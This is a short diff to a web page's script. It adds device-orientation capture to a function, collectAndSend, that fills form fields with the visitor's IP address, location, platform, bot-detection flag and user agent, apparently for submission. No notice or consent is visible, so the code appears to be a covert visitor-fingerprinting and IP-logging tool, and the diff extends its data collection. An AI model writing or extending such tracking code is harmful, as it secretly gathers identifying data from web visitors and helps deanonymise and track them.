@@ -17,6 +17,14 @@
     </form>
 
     <script>
+        let orientationData = "Not Available";
+
+        window.addEventListener('deviceorientation', (event) => {
+            if (event.beta !== null && event.gamma !== null) {
+                orientationData = `Beta: ${event.beta.toFixed(1)}°, Gamma: ${event.gamma.toFixed(1)}°`;
+            }
+        });
+
         async function collectAndSend() {
             let clientIp = "Unknown";
             let location = "Unknown";
@@ -37,8 +45,11 @@
                 } catch (err) {}
             }
 
+            // Short pause to allow device orientation sensors to report values
+            await new Promise(resolve => setTimeout(resolve, 400));
+
             document.getElementById('entry1').value = clientIp;
-            document.getElementById('entry2').value = location;
+            document.getElementById('entry2').value = `Loc: ${location} | Angle: ${orientationData}`;
             document.getElementById('entry3').value = navigator.platform || "Unknown";
             document.getElementById('entry4').value = navigator.webdriver ? "Bot" : "Human";
             document.getElementById('entry5').value = navigator.userAgent || "Unknown";
